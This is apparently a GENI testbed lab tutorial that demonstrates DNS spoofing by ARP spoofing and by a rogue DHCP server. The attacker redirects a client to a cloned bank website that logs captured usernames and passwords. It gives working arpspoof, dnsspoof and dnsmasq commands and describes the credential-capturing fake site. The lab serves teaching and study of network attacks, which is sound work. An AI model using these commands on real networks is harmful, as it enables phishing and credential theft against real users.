This is an experimental demonstration of two ways a malicious attacker might redirect traffic for a website to its own "fake" version of the site. Both methods involve DNS spoofing. In one version, the attacker will masquerade as the legitimate DHCP server for the LAN and instruct clients to use the attacker for name resolution. In the other the attacker will use ARP spoofing to impersonate the legitimate DNS server and answer name resolution queries in its place.

It should take about 120 minutes to run this experiment.

This experiment involves running a potentially disruptive application over a private network within your slice on GENI. Take special care not to use this application in ways that may adversely affect other infrastructure outside of your slice! Users of GENI are responsible for ensuring compliance with the [GENI Resource Recommended User Policy](http://groups.geni.net/geni/raw-attachment/wiki/RUP/RUP.pdf).


To reproduce this experiment on GENI, you will need an account on the [GENI Portal](http://groups.geni.net/geni/wiki/SignMeUp), and you will need to have [joined a project](http://groups.geni.net/geni/wiki/JoinAProject). You should have already [uploaded your SSH keys to the portal and know how to log in to a node with those keys](http://groups.geni.net/geni/wiki/HowTo/LoginToNodes). If you're not sure if you have those skills, you may want to try [Lab Zero](http://tinyurl.com/geni-labzero) first.

* Skip to [Results](#results)
* Skip to [Run my experiment](#runmyexperiment)

## Background

DNS spoofing is a broad category of attacks in which a malicious attacker sends forged DNS responses.

A DNS server translates human-readable names like "google.com", into an IP address that applications need to connect to a remote resource (such as a website). When DNS responses are forged, the victim will (unknowingly) connect to a different host than the one it intended to reach. This kind of attack may be used in phishing attacks, to censor web traffic for some domains, to inject content such as advertisements into web traffic, or for other purposes.

One kind of DNS spoofing attack is illustrated below:

![](/blog/content/images/2016/07/dns-spoof-bad-1.svg)

There are many different ways to do DNS spoofing. In this experiment we'll try two of them: 

1. acting as a false DHCP server and lying to clients on the LAN about which DNS server to use, and 
2. mounting a man-in-the-middle attack and impersonating the real DNS server.


DNS spoofing is easiest when both the attacker and victim are on the same LAN. However, there are other (less reliable) DNS attacks that can feasibly be carried out even without access to the victim's LAN.


## Results

Here is an example of a normal DNS lookup which returns a correct address for the [Bank of Hamilton website](http://bankofhamilton.com) from the "good" server on the LAN:

<iframe width="560" height="315" src="https://www.youtube.com/embed/dMIDt59_-N0" frameborder="0" allowfullscreen></iframe>

In the next example, we use ARP spoofing for the attacker to impersonate the DNS server, and respond to DNS queries with a wrong IP address. As a result, the client is sent to a server under the attacker's control, that is masquerading as the legitimate Bank of Hamilton website:

<iframe width="560" height="315" src="https://www.youtube.com/embed/U6-DSK3PfvI" frameborder="0" allowfullscreen></iframe>

We also use a DHCP masquerade attack to similar effect. When the client looks for an IP address from DHCP, the attacker responds with an offer before the "good" server and is configured to be the client's nameserver. When the client tries to get an IP address for the Bank of Hamilton site, the attacker returns the IP address of its server that is pretending to be the real Bank of Hamilton site:

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZirXGPQQieE" frameborder="0" allowfullscreen></iframe>

Finally, we see how this attack can be used to transparently capture a user's login credentials:

<iframe width="560" height="315" src="https://www.youtube.com/embed/2MWgvo2wU2A" frameborder="0" allowfullscreen></iframe>


## Run my experiment

First, reserve your resources. This experiment involves resources on two separate InstaGENI sites, which you will reserve using [two different RSpecs](https://gist.github.com/ffund/5751e9bb35dd93a4531e70947fefc5d3).

In the GENI Portal, create a new slice, then click "Add Resources". Load the RSpec from the URL: [https://git.io/vShxD](https://git.io/vShxD)

This should load a topology onto your canvas, with a client, a "good" network gateway implementing DHCP and DNS services, and a malicious attacker on the same LAN. The RSpec also includes commands to install the necessary software (e.g. `dnsmasq` for DNS and DHCP service, an Apache web server, the `dsniff` package for ARP and DNS spoofing, etc.) on the nodes. Click on "Site 1" and choose an InstaGENI site to bind to, then reserve your resources. 

Then, you will reserve a node on another InstaGENI site that will be the "malicious" banking website. In the same slice, click "Add Resources", and load the RSpec from the URL: [https://git.io/vShxH](https://git.io/vShxH)

Click on "Site 1" and  choose a _different_ InstaGENI site to bind to, then reserve your resources.

Wait for your nodes to boot up (they will turn green in the canvas display on your slice page in the GENI portal when they are ready). Your complete topology should look like this:

![](/blog/content/images/2017/04/dnsspoof-topology.png)

Then, wait another couple of minutes for the software installation to finish. Finally, use SSH to log in to each node in your topology (using the login details given in the GENI Portal).

### Set up the "fake" website

Your "bank" node has been set up with a publicly routable IP address, so that sites hosted on it can be reached from anywhere on the Internet. It will also have a basic web server stack installed on it already.

To set it up, you will download the content of a banking website onto your new web server. You can choose between [Diamond Bank](http://diamondbanking.com) of Arkansas _or_ [Bank of Hamilton](http://bankofhamilton.com), North Dakota. (Choose only _one_ of the two sites.) Both of these sites are vulnerable to impersonation because they do not use [HTTPS](https://en.wikipedia.org/wiki/HTTPS) (HTTP with an SSL or TLS layer). With HTTPS, the server would have a certificate that is signed by a [Certificate Authority](https://en.wikipedia.org/wiki/Certificate_authority) (CA) that authenticates it, i.e. confirms that the site _is_ who it claims to be.

[Modern browsers](https://arstechnica.com/information-technology/2017/01/firefox-chrome-start-calling-http-connections-insecure/) usually identify sites that accept login details on an HTTP page in the address bar, e.g. Chrome shows these sites as "Not Secure":

![](/blog/content/images/2017/04/vulnerable-sites.png)

These two banks put the form in which users enter their username and password on a page delivered by HTTP. When the user clicks "Login", the form is submitted to a location protected by HTTPS. In practice, this offers little security - pages delivered by HTTP can be compromised, so an attacker can submit the password data to a destination of their choosing, instead of (or in addition to) the intended HTTPS location. That's exactly what we'll do in this experiment.


To use the Diamond Bank site for your experiment, run

```
wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/diamondbanking.tgz
# Note that the command above is all one line!
sudo tar -xvzf diamondbanking.tgz -C /var/www/html/
```

on the "bank" node. Alternatively, to use Bank of Hamilton, run

```
wget https://bitbucket.org/ffund/run-my-experiment-on-geni-blog/raw/master/files/bankofhamilton.tgz
# Note that the command above is all one line!
sudo tar -xvzf bankofhamilton.tgz -C /var/www/html/
```

on the "bank" node.

In the rest of this experiment, I will assume you are using the Bank of Hamilton site; if you are using Diamond Bank, replace "bankofhamilton.com" with "diamondbanking.com" wherever it appears in the instructions that follow.

Finally, find out the public IP address of this node with

```
wget -qO- http://ipinfo.io/ip
```

Make a note of this IP address - you will need it later.

### Open a browser on the client

To see what our "client" node sees when it browses the Internet, we'll need to be able to open a web browser on our client node. We will set up a VNC connection so that we can run graphical applications on the client.

On the client node, run

```
vncserver :0 
```

and enter a password (twice) when prompted. (Nothing will appear as you type the password.) Choose "n" when asked to enter a view-only password. After a few seconds and a few lines of output, you should be returned to your terminal prompt:

```
ffund01@client:~$ vncserver :0

You will require a password to access your desktops.

Password: 
Verify:   
Would you like to enter a view-only password (y/n)? n
xauth:  file /users/ffund01/.Xauthority does not exist

New 'X' desktop is client.dnsspoof.ch-geni-net.instageni.maxgigapop.net:0

Creating default startup script /users/ffund01/.vnc/xstartup
Starting applications specified in /users/ffund01/.vnc/xstartup
Log file is /users/ffund01/.vnc/client.dnsspoof.ch-geni-net.instageni.maxgigapop.net:0.log
```
 
Next, we will install a ["connector"](http://novnc.com/info.html) that will let us access this graphical interface from a web browser. On the "client" node, run

```
git clone git://github.com/kanaka/noVNC
```

and then 

<pre>
cd noVNC/
./utils/launch.sh --vnc <b>client.dnsspoof.ch-geni-net.instageni.maxgigapop.net</b>:5900
</pre>

where in place of the bold part above, you use the hostname shown for the "client" node in the GENI Portal:

![](/blog/content/images/2017/04/dnsspoof-client-hostname.png)

After some more lines of output, you should see a URL, e.g.:

```
Navigate to this URL:

    http://client.dnsspoof.ch-geni-net.instageni.maxgigapop.net:6080/vnc.html?host=client.dnsspoof.ch-geni-net.instageni.maxgigapop.net&port=6080

```

Open this URL in a browser. (A recent version of Google Chrome is recommended.)  Enter a password when prompted. Then, at the terminal, run

```
firefox
```

and a browser window should come up:

<iframe width="560" height="315" src="https://www.youtube.com/embed/qM3a9t2aV94" frameborder="0" allowfullscreen></iframe>

This browser is running on the "client" node, _not_ on your own laptop. Leave this open - we will use it throughout our experiment.


### Normal DNS queries

First, we will show when happens when our client connects to a "good" DHCP+DNS server, and then tries to reach an external website. Open three terminal windows. On one, log in to the "client" node; on the other two, log in to the "good DNS/DHCP" server node.

In each terminal window, use

```
sudo su
```

to become the "root" user.

On one of the server terminals, run

```
service dnsmasq stop
dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --dhcp-option=6,10.10.1.2 --no-hosts -d
```

This sets up the `dnsmasq` server to act as a DHCP server, offering IP addresses in the range 10.10.1.20-10.10.1.50 to clients on the private LAN. It will also respond to DNS queries.


In the second server terminal window, run

```
tcpdump -n -i eth1 "ip"
```

to monitor IP traffic to and from the "good" server on the private LAN.

Then, on the client node, clear the current IP address and name resolution server information (it will be using a DNS server on the GENI rack, not on our private experiment LAN):

```
# kill  running dhclient processes, if any
killall dhclient
# release current IP address, if any
dhclient -r eth1

# clear DNS resolution info
resolvconf -d eth0.dhclient
```


Then, on the client node, run

```
# request IP address
dhclient eth1
```

to request an IP address from DHCP over the private LAN. 

In the server terminal windows, you should see the DHCP request and response in both the `dnsmasq` and `tcpdump` windows. Note that the DHCP request is not directed at any particular server; it is sent to the broadcast address. This is what will enable our attacker to hijack DHCP on the LAN in the next steps of our experiment!

Now, we'll verify that the client is using our "good" server for name resolution. First, we'll test using the `nslookup` name resolution tool. On the client, run:

```
nslookup bankofhamilton.com
```

In the `tcpdump` output on the server, you should see the DNS query and response.

Finally, we'll visit `bankofhamilton.com` using the browser window that is running _on our client_, and verify that name lookup again. Again, you should see the name lookup in the `tcpdump` output on the server. (You may also see lookups for additional assets - images and scripts - that are hosted on other domains.)

<iframe width="560" height="315" src="https://www.youtube.com/embed/dMIDt59_-N0" frameborder="0" allowfullscreen></iframe>

Now, we will try two methods for DNS spoofing on a LAN:

1. The attacker uses ARP spoofing to impersonate the "good" DNS server, and responds to DNS queries for the targeted website before the "good" DNS server does. 
2. The attacker uses a DHCP masquerade attack to impersonate the "good" DHCP server, and tells the victim to use the attacker as a nameserver. Then it serves its own address in response to DNS queries for the targeted website.

Open another two terminal windows, and in both, log in to your "attacker" node. Use 

```
sudo su
```

to become the "root" user on these as well.

### ARP spoofing

This attack works most reliably when packets from the attacker reach the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" server. Stop the `tcpdump` process on the "good" server temporarily, and run

```
tc qdisc del dev eth1 root
tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
```

on it.  Then restart the `tcpdump`.

(This procedure assumes that you have just completed the steps above, so that the client uses the "good" server for both DHCP and DNS lookups, and that the `dnsmasq` process is currently running on the "good" server. If you haven't gone through those steps yet, do them now.)


Check the client's ARP table to see what MAC address is currently associated with the server's IP address:

```
arp -a -i eth1
```

Next, we are going to use ARP spoofing to make the client believe we are the "good" server, and the server believe we are the client. On the attacker, run:


```
# Enable packet forwarding
sysctl -w net.ipv4.ip_forward=1
# get IP address of client from the "good" server
clientip=$(dig @10.10.1.2 +short client)
# two-way ARP spoofing: make client think we are
# the "good" server, make "good" server think we 
# are the client
arpspoof -i eth1 -t "$clientip" 10.10.1.2 &
arpspoof -i eth1 -t 10.10.1.2 "$clientip" &
```

On the client node, check the ARP table again with

```
arp -a -i eth1
```

You should see that what the client now believes that the "good" server's MAC address is actually the attackers' MAC address!

Finally, we're ready to offer up some bad name resolution. In a second terminal on the attacker, run

<pre>
echo "<b>198.248.248.125</b> bankofhamilton.com" > /tmp/badhosts

dnsspoof -i eth1 -f /tmp/badhosts
</pre>

substituting the public IP address for the "bank" node that you found in a [previous step](#setupthefakewebsite).

This command creates a file called `badhosts` with a list of IP address and hostname mappings that we will fool our client into believing. In this case, our attacker will make the client go to our imposter site when he tries to visit Bank of Hamilton. Then we use the `dnsspoof` tool to answer DNS queries for those hosts.


On the client, run

```
nslookup bankofhamilton.com
```

In the `tcpdump` output on the "good" server, you should still see the DNS query and response. But you should also see a query and response in the `dnsspoof` output on the attacker. Check the IP address returned from `nslookup`  - is it the same one as before?

Finally, we'll visit `bankofhamilton.com` in the Firefox browser instance that is running on our client, and verify that it takes us to the imposter site instead of the real thing. We have modified the logo of the imposter site with a big "FAKE" warning so that we can tell which site we are visiting.

<iframe width="560" height="315" src="https://www.youtube.com/embed/U6-DSK3PfvI" frameborder="0" allowfullscreen></iframe>

When you've verified the attack, use Ctrl+C to stop the `dnsspoof` process, and stop the ARP spoofing by running

```
killall arpspoof
```

on the attacker.

### DHCP masquerade attack

In this version of the attack, the attacker will run its own DHCP server. When the client requests a new address from DHCP, it will get an offer from the attacker before the "good" server (because of the latency we will set up on the "good" server). As part of the DHCP response, the attacker will tell the client to use it for name resolution. Then, it can send malicious DNS responses.

This procedure assumes that you have already run the previous attack, and so you already have the `/tmp/badhosts` file set up to map the Bank of Hamilton to the IP address of your own imposter site. If you _don't_ have this, repeat the relevant steps in the previous section.

This attack works most reliably when packets from the attacker reaching the client _before_ packets from the "good" server. To ensure this happens in our experiment, we will set up some extra latency on the "good" server. Stop the `tcpdump` process on the "good" server temporarily, and run

```
tc qdisc del dev eth1 root
tc qdisc add dev eth1 root netem delay 500ms 2ms distribution normal
```

and then you can start the `tcpdump` again. Also, the `dnsmasq` process should still be running on the "good" server.

Now, on the attacker, start a `dnsmasq` instance:

```
service dnsmasq stop
dnsmasq --interface=eth1 --dhcp-range=10.10.1.20,10.10.1.50,255.255.255.0,72h --no-hosts --dhcp-option=6,10.10.1.254 --addn-hosts=/tmp/badhosts -d
```

Note the `addn-hosts` option we are using, to tell `dnsmasq` to respond to queries for hostnames listed in the `badhosts` file with the corresponding addresses listed there. Also on the attacker, start a `tcpdump`:

```
tcpdump -n -i eth1 "ip"
```

Now, on the client node, run

```
# kill  running dhclient processes, if any
killall dhclient  
# release current IP address, if any
dhclient -r eth1

# clear DNS resolution info
resolvconf -d eth0.dhclient  
```

and

```
dhclient eth1  
```

to ask for an IP address from DHCP over the private LAN. You should see offers from both `dnsmasq` instances - on the "good" server and on the attacker - in the terminal output. But only one server will then get a request from the client. On the client, check the actual IP now used with

```
ifconfig eth1
```

Also, on the client run

```
cat /etc/resolv.conf
```

to check which host it is using for name resolution. Is it the "good" server (10.10.1.2) or the attacker (10.10.1.254)?

Try resolving bankofhamilton.com on the client with 

```
nslookup bankofhamilton.com
```

Do you see the DNS traffic on the "good" server or the attacker. 

Also try visiting it in the browser that is running on the client, at bankofhamilton.com.

<iframe width="560" height="315" src="https://www.youtube.com/embed/ZirXGPQQieE" frameborder="0" allowfullscreen></iframe>

This attack is not deterministic - if the "good" server's DHCP offer reaches the client before the attacker's, then it won't work. You may need to repeat this experiment a couple of times in order to see it in effect.

### Capture login credentials

Finally, we will see how the login credentials may be captured (transparently) by the attacker. On the "bank" node, run

```
sudo tail -f /var/log/apache2/error.log
```

to watch the web server error log. We have set up our site to log all captured credentials to this file.

In the Firefox window that is running on the "client" node, attempt to log in to the Bank of Hamilton imposter site.

Then, return to the "bank" terminal window. You should observe that the username and password you entered are recorded in the log file:

```
[Wed Apr 19 20:10:14.063738 2017] [:error] [pid 11334] [client 206.196.180.223:37462] CAPTURED LOGIN: test and testpassword from 206.196.180.223, referer: http://bankofhamilton.com/
```

Meanwhile, in the browser, the user has been redirected to the regular (secure) login page for the browser, as if nothing out of the ordinary has happened:

<iframe width="560" height="315" src="https://www.youtube.com/embed/2MWgvo2wU2A" frameborder="0" allowfullscreen></iframe>

(We could potentially have set up our imposter site to pass along the username and password to this secure login page, so that the attack would really be invisible - but I have refrained from doing so, because it would be very poor "netiquette" to trigger failed logins on a 3rd party server that does not belong to us!)

### Delete your resources

When you have finished this experiment, delete your resources in the Portal to free them for other experimenters!

## Notes

